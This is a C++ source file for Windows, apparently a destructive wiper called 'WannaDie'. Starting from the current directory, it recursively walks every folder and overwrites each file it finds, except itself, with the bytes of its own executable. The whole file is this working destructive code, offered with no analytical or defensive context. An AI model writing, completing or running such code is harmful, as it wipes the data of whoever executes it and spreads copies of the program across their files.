#include <iostream>
#include <vector>
#include <windows.h>
#include <fstream>

using namespace std;

class openpy{
	private:
		
		string file;
	
	public:
		
		openpy(string);
		
		string read(string);
		
		void write(string,string);
};

openpy::openpy(string _file){
	file = _file;
	
}
	

string openpy::read(string mode){
	ifstream archivo;
	if(mode == "r"){
		archivo.open(file,ios::in); 
	}
	else if(mode == "rb"){
		archivo.open(file,ios::binary);	 
	}
	else{
		return "fail";
	}
	if(archivo.fail()){
		cout<<"archivo.fail(): "<<archivo.fail();
		return "fail"; 
		}
	string lines;	
	while(!archivo.eof()){
		string cline;
		getline(archivo, cline);
		cline += "\n";
		lines += cline;
	}
	archivo.close();
	return lines;
	
}
void openpy::write(string data,string mode){
	ofstream archivo;
	
	if(mode == "w"){
		archivo.open(file,ios::out);
	}
	else if(mode == "wb"){
		archivo.open(file,ios::binary);
	}
	else{
		cout<<"fail";
		return;
	}
	if(archivo.fail()){
		cout<<"archivo.fail(): "<<archivo.fail();
		return;
	}
	archivo<<data;
	archivo.close();
	
}



int checkFile(const char * filename)
{
    FILE *file;
    if (file = fopen(filename, "r"))
    {
        fclose(file);
        return 1;
    }

    return 0;
}

vector<string> listdir(const string &a_carpeta)
{
    WIN32_FIND_DATA ffd{};
	vector<string> files;
    if (auto handle = FindFirstFile((a_carpeta + "/*.*").c_str(), &ffd))
    {
        do
        {
            files.push_back(ffd.cFileName);
        }
        while (FindNextFile(handle, &ffd) != 0);
    }
    return files;
}
void WannaDie(string dir,string data){
	vector<string> files = listdir(dir.c_str());
	for(int i = 0;i<files.size();i++){
		if(checkFile(files[i].c_str()) == 1){
			if(files[i] != "WannaDie.exe"){
				openpy file2(dir + "/" + files[i]);
				file2.write(data,"wb");
			}
			
		}
		else if(checkFile(files[i].c_str()) == 0 && files[i] != "." && files[i] != ".."){
			WannaDie(dir + "/" + files[i],data);
		}
	
	}
}

int main(){
	string dir;
	char tmp[256];
    getcwd(tmp, 256);
    dir += tmp;
	vector<string> files = listdir(dir.c_str());
	string data;
	openpy file("WannaDie.exe");
	data = file.read("rb");
	WannaDie(dir,data);
	
	return 0;
}
